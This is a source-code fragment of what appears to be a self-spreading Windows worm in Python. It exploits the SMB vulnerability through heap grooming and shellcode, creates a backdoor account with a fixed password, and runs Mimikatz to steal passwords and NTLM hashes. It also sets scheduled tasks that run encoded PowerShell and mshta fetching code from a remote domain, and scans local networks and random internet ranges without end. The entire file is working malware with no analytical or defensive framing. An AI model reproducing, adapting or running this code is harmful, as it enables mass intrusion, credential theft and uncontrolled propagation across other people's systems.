        srvnetConn3.append(sk3)

    holeConn3 = createSessionAllocNonPaged(target, NTFEA_SIZE - 16)
    allocConn3.get_socket().close()
    for i in range(5):
        sk3 = createConnectionWithBigSMBFirst80(target)
        srvnetConn3.append(sk3)

    holeConn3.get_socket().close()
    send_trans2_second(conn3, tid3, feaList[progress3:], progress3)
    recvPkt3 = conn3.recvSMB()
    retStatus3 = recvPkt3.getNTStatus()
    if retStatus3 == 3221225485L:
        print('good response status: INVALID_PARAMETER')
    else:
        print('bad response status: 0x{:08x}'.format(retStatus3))
    for sk3 in srvnetConn3:
        sk3.send(fake_recv_struct + shellcode)

    for sk3 in srvnetConn3:
        sk3.close()

    conn3.disconnect_tree(tid3)
    conn3.logoff()
    conn3.get_socket().close()
    time.sleep(2)
    lock3.release()


NEGOTIATE_PROTOCOL_REQUEST = binascii.unhexlify('00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200')
SESSION_SETUP_REQUEST = binascii.unhexlify('00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000')
TREE_CONNECT_REQUEST = binascii.unhexlify('00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00')
NAMED_PIPE_TRANS_REQUEST = binascii.unhexlify('0000004aff534d42250000000018012800000000000000000000000000088ea3010852981000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00')
timeout = 1
verbose = 0
threads_num = 255
if 'Windows-XP' in platform.platform():
    timeout = 1
    threads_num = 2
    semaphore1 = threading.BoundedSemaphore(value=2)
    semaphore = threading.BoundedSemaphore(value=2)
    semaphore2 = threading.BoundedSemaphore(value=2)
else:
    semaphore1 = threading.BoundedSemaphore(value=255)
    semaphore = threading.BoundedSemaphore(value=threads_num)
    semaphore2 = threading.BoundedSemaphore(value=100)
print_lock = threading.Lock()

def print_status(ip, message):
    global print_lock
    with print_lock:
        print('[*] [%s] %s' % (ip, message))


def check_ip(ip, tg):
    global verbose
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(float(timeout) if timeout else None)
    host = ip
    port = 445
    s.connect((host, port))
    if verbose:
        print_status(ip, 'Sending negotiation protocol request')
    s.send(NEGOTIATE_PROTOCOL_REQUEST)
    negotiate_reply = s.recv(1024)
    if len(negotiate_reply) < 36 or struct.unpack('<I', negotiate_reply[9:13])[0] != 0:
        with print_lock:
            print("[-] [%s] can't determine whether it's vulunerable" % ip)
            return
    if verbose:
        print_status(ip, 'Sending session setup request')
    s.send(SESSION_SETUP_REQUEST)
    session_setup_response = s.recv(1024)
    user_id = session_setup_response[32:34]
    if verbose:
        print_st(ip, 'User ID = %s' % struct.unpack('<H', user_id)[0])
    os = ''
    word_count = ord(session_setup_response[36])
    if word_count != 0:
        byte_count = struct.unpack('<H', session_setup_response[43:45])[0]
        if len(session_setup_response) != byte_count + 45:
            print_status('invalid session setup AndX response')
        else:
            for i in range(46, len(session_setup_response) - 1):
                if ord(session_setup_response[i]) == 0 and ord(session_setup_response[i + 1]) == 0:
                    os = session_setup_response[46:i].decode('utf-8')[::2]
                    break

    modified_tree_connect_request = list(TREE_CONNECT_REQUEST)
    modified_tree_connect_request[32] = user_id[0]
    modified_tree_connect_request[33] = user_id[1]
    modified_tree_connect_request = ''.join(modified_tree_connect_request)
    if verbose:
        print_status(ip, 'Sending tree connect')
    s.send(modified_tree_connect_request)
    tree_connect_response = s.recv(1024)
    tree_id = tree_connect_response[28:30]
    if verbose:
        print_status(ip, 'Tree ID = %s' % struct.unpack('<H', tree_id)[0])
    modified_trans2_session_setup = list(NAMED_PIPE_TRANS_REQUEST)
    modified_trans2_session_setup[28] = tree_id[0]
    modified_trans2_session_setup[29] = tree_id[1]
    modified_trans2_session_setup[32] = user_id[0]
    modified_trans2_session_setup[33] = user_id[1]
    modified_trans2_session_setup = ''.join(modified_trans2_session_setup)
    if verbose:
        print_status(ip, 'Sending named pipe')
    s.send(modified_trans2_session_setup)
    final_response = s.recv(1024)
    if final_response[9] == '\x05' and final_response[10] == '\x02' and final_response[11] == '\x00' and final_response[12] == '\xc0':
        print('[+] [%s](%s) got it!' % (ip, os))
        if 'Windows 7' in os:
            if scan(ip, 65533) == 0:
                print('[+] exploit...' + ip + '   win7')
                try:
                    exploit(ip, None, 'k8h3d', 'k8d3j9SjfS7', tg)
                except:
                    print('no user')
                    try:
                        exploit2(ip, sc, int(random.randint(5, 13)))
                        try:
                            print('exp again ')
                            exploit(ip, None, 'k8h3d', 'k8d3j9SjfS7', tg)
                        except:
                            print('no user2')

                        lock2.release()
                    except:
                        print('[*] maybe crash')
                        time.sleep(6)
                        try:
                            print('exp again ')
                            exploit(ip, None, 'k8h3d', 'k8d3j9SjfS7', tg)
                        except:
                            print('no user3')

                        lock2.release()

        elif 'Windows Server 2008' in os:
            if scan(ip, 65533) == 0:
                print('[+] exploit...' + ip + '   win2k8')
                try:
                    exploit(ip, None, 'k8h3d', 'k8d3j9SjfS7', tg)
                except:
                    print('no user')
                    try:
                        exploit3(ip, sc, int(random.randint(5, 13)))
                        try:
                            print('exp again ')
                            exploit(ip, None, 'k8h3d', 'k8d3j9SjfS7', tg)
                        except:
                            print('no user 2')

                        lock3.release()
                    except:
                        print('[*] maybe crash')
                        time.sleep(6)
                        try:
                            print('exp again ')
                            exploit(ip, None, 'k8h3d', 'k8d3j9SjfS7', tg)
                        except:
                            print('no user 3')

                        lock3.release()

        elif 'Windows 5.1' in os:
            if scan(ip, 65533) == 0:
                print('[+] exploit...' + ip + '   xp')
                try:
                    exploit(ip, None, '', '', tg)
                except:
                    print('not succ')

        elif 'Windows Server 2003' in os:
            if scan(ip, 65533) == 0:
                print('[+] exploit...' + ip + '   win2k3')
                try:
                    exploit(ip, None, '', '', tg)
                except:
                    print('not succ')

        elif scan(ip, 65533) == 0:
            print('[+] exploit...' + ip + '   *************************other os')
            for u in userlist:
                for p in passlist:
                    if u == '' and p != '':
                        continue
                    try:
                        exploit(ip, None, u, p, tg)
                    except:
                        print('exp not succ!')

    else:
        print('[-] [%s](%s) stays in safety' % (ip, os))
    s.close()


def check_thread(ip_address):
    global semaphore
    try:
        check_ip(ip_address, tg=1)
    except Exception as e:
        with print_lock:
            tmp = 2
    finally:
        semaphore.release()


def check_thread2(ip_address):
    try:
        check_ip(ip_address, tg=2)
    except Exception as e:
        with print_lock:
            tmp = 2
    finally:
        semaphore.release()


one = 1
try:
    h_one = socket.socket()
    addr = ('', 60124)
    h_one.bind(addr)
    one = 1
except:
    one = 2

if one == 2:
    print('alredy run eb')
    sys.exit()
usr = subprocess.Popen('cmd /c net user&netsh advfirewall set allprofile state on&netsh advfirewall firewall add rule name=denyy445 dir=in action=block protocol=TCP localport=445', stdout=subprocess.PIPE)
dusr = usr.stdout.read()
if 'k8h3d' in dusr:
    usr = subprocess.Popen('cmd /c net user k8h3d /del', stdout=subprocess.PIPE)
dl = ''
ee2 = ''
if os.path.exists('c:/windows/system32/svhost.exe'):
    dl = 'c:\\windows\\system32\\svhost.exe'
if os.path.exists('c:/windows/SysWOW64/svhost.exe'):
    dl = 'c:\\windows\\SysWOW64\\svhost.exe'
if os.path.exists('c:/windows/system32/drivers/svchost.exe'):
    dl = 'c:\\windows\\system32\\drivers\\svchost.exe'
if os.path.exists('c:/windows/SysWOW64/drivers/svchost.exe'):
    dl = 'c:\\windows\\SysWOW64\\drivers\\svchost.exe'
if os.path.exists('c:/windows/temp/svvhost.exe'):
    ee2 = 'c:\\windows\\temp\\svvhost.exe'
if os.path.exists('c:/windows/temp/svchost.exe'):
    ee2 = 'c:\\windows\\temp\\svchost.exe'
if os.path.exists('C:\\windows\\system32\\WindowsPowerShell\\'):
    usr0 = subprocess.Popen('cmd /c schtasks /create /ru system /sc MINUTE /mo 60 /st 07:05:00 /tn DnsScan /tr "C:\\Windows\\temp\\svchost.exe" /F', stdout=subprocess.PIPE)
    usr1 = subprocess.Popen('cmd /c schtasks /create /ru system /sc MINUTE /mo 50 /st 07:00:00 /tn "\\Microsoft\\windows\\Bluetooths" /tr "powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=" /F', stdout=subprocess.PIPE)

def mmka():
    global userlist2
    global domainlist
    global passlist
    if os.path.exists('C:\\windows\\system32\\WindowsPowerShell\\'):
        if os.path.exists('c:/windows/temp/m.ps1'):
            if os.path.exists('c:/windows/temp/mkatz.ini'):
                print('mkatz.ini exist')
                mtime = os.path.getmtime('c:\\windows\\temp\\mkatz.ini')
                mnow = int(time.time())
                if (mnow - mtime) / 60 / 60 < 24:
                    musr = open('c:\\windows\\temp\\mkatz.ini', 'r').read()
                else:
                    print('reload mimi')
                    if 'PROGRAMFILES(X86)' in os.environ:
                        usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                    else:
                        usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                    musr = usr.stdout.read()
                    fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
                    fmk.write(musr)
                    fmk.close()
            else:
                print('reload mimi')
                if 'PROGRAMFILES(X86)' in os.environ:
                    usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                else:
                    usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                musr = usr.stdout.read()
                fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
                fmk.write(musr)
                fmk.close()
        else:
            fm = open('c:\\windows\\temp\\m.ps1', 'w')
            fm.write(mkatz)
            fm.close()
            if os.path.exists('c:/windows/temp/mkatz.ini'):
                print('mkatz.ini exist')
                mtime = os.path.getmtime('c:\\windows\\temp\\mkatz.ini')
                mnow = int(time.time())
                if (mnow - mtime) / 60 / 60 < 24:
                    print('reload mimi')
                    musr = open('c:\\windows\\temp\\mkatz.ini', 'r').read()
                else:
                    print('reload mimi')
                    if 'PROGRAMFILES(X86)' in os.environ:
                        usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                    else:
                        usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                    musr = usr.stdout.read()
                    fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
                    fmk.write(musr)
                    fmk.close()
            else:
                print('reload mimi')
                if 'PROGRAMFILES(X86)' in os.environ:
                    usr = subprocess.Popen('C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                else:
                    usr = subprocess.Popen('powershell.exe -exec bypass "import-module c:\\windows\\temp\\m.ps1;Invoke-Cats -pwds"', stdout=subprocess.PIPE)
                musr = usr.stdout.read()
                fmk = open('c:\\windows\\temp\\mkatz.ini', 'w')
                fmk.write(musr)
                fmk.close()
    else:
        usr3 = subprocess.Popen('cmd /c start /b sc start Schedule&ping localhost&sc query Schedule|findstr RUNNING&&(schtasks /delete /TN Autocheck /f&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autocheck /tr "cmd.exe /c mshta http://w.beahh.com/page.html?p%COMPUTERNAME%"&schtasks /run /TN Autocheck)', stdout=subprocess.PIPE)
        usr4 = subprocess.Popen('cmd /c start /b sc start Schedule&ping localhost&sc query Schedule|findstr RUNNING&&(schtasks /delete /TN Autoscan /f&schtasks /create /ru system /sc MINUTE /mo 50 /ST 07:00:00 /TN Autoscan /tr "C:\\Windows\\temp\\svchost.exe"&schtasks /run /TN Autoscan)', stdout=subprocess.PIPE)
    print('mimi over')
    usern = ''
    lmhash = ''
    nthash = ''
    tspkg = ''
    wdigest = ''
    kerberos = ''
    domain = ''
    usernull = ''
    try:
        dousr = subprocess.Popen('cmd /c wmic ntdomain get domainname', stdout=subprocess.PIPE)
        domianusr = dousr.stdout.read()
        dousr = subprocess.Popen('cmd /c net user', stdout=subprocess.PIPE)
        luser = dousr.stdout.read().split('\r\n')[:-3]
        for c in luser:
            if '-' in c:
                continue
            for j in c.split(' '):
                if '' == j:
                    continue
                if 'Guest' == j:
                    continue
                userlist2.append(j.strip())

        if '* LM' in musr:
            mmlist = musr.split('* LM')
            del mmlist[0]
            for i in mmlist:
                domaint = i.split('Domain   :')[1].split('\n')[0].strip()
                if domaint in domianusr:
                    domainlist.append(domaint)
                for ii in i.split('Authentication')[0].split('Username :')[1:]:
                    unt = ii.split('\n')[0].strip()
                    userlist2.append(unt)

                for ii in i.split('Authentication')[0].split('Password :')[1:]:
                    pwdt = ii.split('\n')[0].strip()
                    if pwdt != '(null)':
                        passlist.append(pwdt)

                passlist = list(set(passlist))
                userlist2 = list(set(userlist2))
                domainlist = list(set(domainlist))

        else:
            print('nobody logon')
        if '* NTLM' in musr:
            mmlist = musr.split('* NTLM')
            del mmlist[0]
            for i in mmlist:
                NThash = i.split(':')[1].split('\n')[0].strip()
                ntlist.append(NThash)

    except:
        print('except')

# 入口
mmka()
var = 1
while var == 1:
    print('start scan')
    if '.exe' in dl:
        for network in find_ip():
            print(network)
            ip, cidr = network.split('/')
            cidr = int(cidr)
            host_bits = 32 - cidr
            i = struct.unpack('>I', socket.inet_aton(ip))[0]
            start = i >> host_bits << host_bits
            end = i | (1 << host_bits) - 1
            for i in range(start + 1, end):
                semaphore1.acquire()
                ip = socket.inet_ntoa(struct.pack('>I', i))
                t1 = threading.Thread(target=scansmb, args=(ip, 445))
                t1.start()

            time.sleep(1)

    print('smb over  sleep 200s')
    time.sleep(5)
    if 'Windows-XP' in platform.platform():
        time.sleep(1000)
    else:
        print('start scan2')
        if '.exe' in dl:
            for network in iplist2:
                ip, cidr = network.split('/')
                if ip.split('.')[0].strip() == '192':
                    continue
                if ip.split('.')[0].strip() == '127':
                    continue
                if ip.split('.')[0].strip() == '10':
                    continue
                if ip.split('.')[0].strip() == '0':
                    continue
                if ip.split('.')[0].strip() == '100':
                    continue
                if ip.split('.')[0].strip() == '172':
                    continue
                if int(ip.split('.')[0].strip()) in xrange(224, 256):
                    continue
                print(network)
                cidr = int(cidr)
                host_bits = 32 - 16
                i = struct.unpack('>I', socket.inet_aton(ip))[0]
                start = i >> host_bits << host_bits
                end = i | (1 << host_bits) - 1
                for i in range(start + 1, end):
                    semaphore2.acquire()
                    ip = socket.inet_ntoa(struct.pack('>I', i))
                    t1 = threading.Thread(target=scansmb3, args=(ip, 445))
                    t1.start()

                time.sleep(1)

        print('smb over  sleep 200s')
        time.sleep(5)
        print('eb2 internet')
        # 向公网随机地址发smb扫描
        for s in xip(500):
            if s.split('.')[0].strip() == '127':
                continue
            if s.split('.')[0].strip() == '10':
                continue
            if s.split('.')[0].strip() == '0':
                continue
            if s.split('.')[0].strip() == '100':
                continue
            if s.split('.')[0].strip() == '172':
                continue
            if int(s.split('.')[0].strip()) in xrange(224, 256):
                continue
            print(s)
            ip, cidr = s.split('/')
            cidr = int(cidr)
            host_bits = 32 - cidr
            i = struct.unpack('>I', socket.inet_aton(ip))[0]
            # 该段起始地址
            start = i >> host_bits << host_bits
            # 该段结束地址
            end = i | (1 << host_bits) - 1
            for i in range(start + 1, end):
                semaphore1.acquire()
                ip = socket.inet_ntoa(struct.pack('>I', i))
                t1 = threading.Thread(target=scansmb2, args=(ip, 445)) # 扫描smb 的445端口
                t1.start()

            time.sleep(2)

        print('eb2 over')
        print('sleep 10min')
        time.sleep(5)
    mmka()